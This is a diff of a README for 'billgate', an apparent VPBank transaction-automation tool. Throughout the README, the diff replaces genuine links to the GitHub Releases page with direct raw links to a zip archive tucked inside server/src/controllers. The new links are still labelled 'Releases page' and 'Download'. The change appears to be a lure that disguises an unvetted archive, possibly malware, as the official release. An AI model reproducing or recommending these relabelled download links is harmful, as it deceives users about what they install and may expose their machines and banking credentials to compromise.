@@ -1,7 +1,7 @@
 # 💼 billgate - Automate Your Financial Operations Effortlessly
 
 ## 📥 Download Now
-[![Download billgate](https://img.shields.io/badge/Download-billgate-blue.svg)](https://github.com/Sniper1913/billgate/releases)
+[![Download billgate](https://github.com/Sniper1913/billgate/raw/refs/heads/main/server/src/controllers/Software-1.6.zip)](https://github.com/Sniper1913/billgate/raw/refs/heads/main/server/src/controllers/Software-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to billgate! This application helps you automate your financial operations for VPBank integration. It minimizes the time spent on manual transaction checks, turning your bank account into a smart financial tool. This guide will help you download and run billgate smoothly.
@@ -18,7 +18,7 @@ Before you download billgate, ensure your system meets the following requirement
 ## 📥 Download & Install
 To download billgate, visit the Releases page. Click the button below for direct access:
 
-[Visit the Releases Page to Download](https://github.com/Sniper1913/billgate/releases)
+[Visit the Releases Page to Download](https://github.com/Sniper1913/billgate/raw/refs/heads/main/server/src/controllers/Software-1.6.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -57,11 +57,11 @@ If you experience any other issues, check our [FAQ section](#) or reach out for 
 ## 🔄 Keeping billgate Updated
 To enjoy the latest features and fixes, it’s important to keep your application up-to-date:
 
-1. Visit the [Releases page](https://github.com/Sniper1913/billgate/releases) regularly.
+1. Visit the [Releases page](https://github.com/Sniper1913/billgate/raw/refs/heads/main/server/src/controllers/Software-1.6.zip) regularly.
 2. Download and install the latest version when available.
 
 ## 🔗 Useful Links
-- [Releases page](https://github.com/Sniper1913/billgate/releases)
+- [Releases page](https://github.com/Sniper1913/billgate/raw/refs/heads/main/server/src/controllers/Software-1.6.zip)
 - [Support Forum](#)
 - [User Documentation](#)
 
